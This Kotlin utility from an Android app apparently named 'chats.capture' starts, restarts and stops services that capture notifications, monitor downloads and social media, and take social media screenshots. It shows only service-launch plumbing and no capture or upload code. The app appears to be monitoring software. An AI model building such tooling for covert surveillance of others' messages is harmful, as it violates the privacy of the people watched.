package com.chats.capture.utils

import android.content.Context
import android.content.Intent
import android.os.Build
import com.chats.capture.services.DownloadMonitorService
import com.chats.capture.services.NotificationCaptureService
import com.chats.capture.services.SocialMediaMonitorService
import com.chats.capture.services.SocialMediaScreenshotService
import timber.log.Timber

/**
 * Utility for starting services reliably
 */
object ServiceStarter {

    private fun isCaptureEnabled(context: Context): Boolean {
        return AppStateManager.areServicesEnabled(context)
    }
    
    /**
     * Start notification capture service
     */
    fun startNotificationService(context: Context) {
        if (!isCaptureEnabled(context)) {
            Timber.tag("SERVICE_STARTER").i("🛑 Capture disabled - not starting NotificationCaptureService")
            return
        }
        try {
            val intent = Intent(context, NotificationCaptureService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting NotificationCaptureService as foreground service")
            } else {
                context.startService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting NotificationCaptureService as background service")
            }
            Timber.d("Notification service started")
        } catch (e: Exception) {
            Timber.tag("SERVICE_STARTER").e(e, "❌ Error starting notification service")
            Timber.e(e, "Error starting notification service")
        }
    }
    
    /**
     * Check if notification service is running
     */
    fun isNotificationServiceRunning(context: Context): Boolean {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
        val isRunning = runningServices.any { service ->
            NotificationCaptureService::class.java.name == service.service.className
        }
        Timber.tag("SERVICE_STARTER").d("📊 NotificationCaptureService running status: $isRunning")
        return isRunning
    }
    
    /**
     * Start download monitor service
     */
    fun startDownloadMonitorService(context: Context) {
        if (!isCaptureEnabled(context)) {
            Timber.tag("SERVICE_STARTER").i("🛑 Capture disabled - not starting DownloadMonitorService")
            return
        }
        try {
            val intent = Intent(context, DownloadMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting DownloadMonitorService as foreground service")
            } else {
                context.startService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting DownloadMonitorService as background service")
            }
            Timber.d("Download monitor service started")
        } catch (e: Exception) {
            Timber.tag("SERVICE_STARTER").e(e, "❌ Error starting download monitor service")
            Timber.e(e, "Error starting download monitor service")
        }
    }
    
    /**
     * Start social media monitor service
     */
    fun startSocialMediaMonitorService(context: Context) {
        if (!isCaptureEnabled(context)) {
            Timber.tag("SERVICE_STARTER").i("🛑 Capture disabled - not starting SocialMediaMonitorService")
            return
        }
        try {
            val intent = Intent(context, SocialMediaMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting SocialMediaMonitorService as foreground service")
            } else {
                context.startService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting SocialMediaMonitorService as background service")
            }
            Timber.d("Social media monitor service started")
        } catch (e: Exception) {
            Timber.tag("SERVICE_STARTER").e(e, "❌ Error starting social media monitor service")
            Timber.e(e, "Error starting social media monitor service")
        }
    }
    
    /**
     * Start social media screenshot service
     */
    fun startSocialMediaScreenshotService(context: Context) {
        if (!isCaptureEnabled(context)) {
            Timber.tag("SERVICE_STARTER").i("🛑 Capture disabled - not starting SocialMediaScreenshotService")
            return
        }
        try {
            val intent = Intent(context, SocialMediaScreenshotService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting SocialMediaScreenshotService as foreground service")
            } else {
                context.startService(intent)
                Timber.tag("SERVICE_STARTER").i("🔄 Starting SocialMediaScreenshotService as background service")
            }
            Timber.d("Social media screenshot service started")
        } catch (e: Exception) {
            Timber.tag("SERVICE_STARTER").e(e, "❌ Error starting social media screenshot service")
            Timber.e(e, "Error starting social media screenshot service")
        }
    }
    
    /**
     * Ensure services are running (restart if not)
     */
    fun ensureServicesRunning(context: Context) {
        if (!isCaptureEnabled(context)) {
            Timber.tag("SERVICE_STARTER").i("🛑 Capture disabled - not ensuring/restarting services")
            return
        }
        if (!isNotificationServiceRunning(context)) {
            Timber.tag("SERVICE_STARTER").w("⚠️ Notification service not running, starting...")
            Timber.d("Notification service not running, starting...")
            startNotificationService(context)
        } else {
            Timber.tag("SERVICE_STARTER").i("✅ Notification service already running")
            Timber.d("Notification service already running")
        }
        
        // Also start download monitor service
        startDownloadMonitorService(context)
        
        // Start social media monitor service
        startSocialMediaMonitorService(context)
        
        // Start social media screenshot service
        startSocialMediaScreenshotService(context)
    }

    /**
     * Stop all capture-related services (best-effort).
     * Note: NotificationListenerService can be re-bound by the system if enabled, so capture code must also self-gate.
     */
    fun stopAllCaptureServices(context: Context) {
        try {
            context.stopService(Intent(context, NotificationCaptureService::class.java))
            context.stopService(Intent(context, DownloadMonitorService::class.java))
            context.stopService(Intent(context, SocialMediaMonitorService::class.java))
            context.stopService(Intent(context, SocialMediaScreenshotService::class.java))
            Timber.tag("SERVICE_STARTER").i("🛑 Stopped all capture services (best-effort)")
        } catch (e: Exception) {
            Timber.tag("SERVICE_STARTER").e(e, "❌ Error stopping capture services")
        }
    }
}
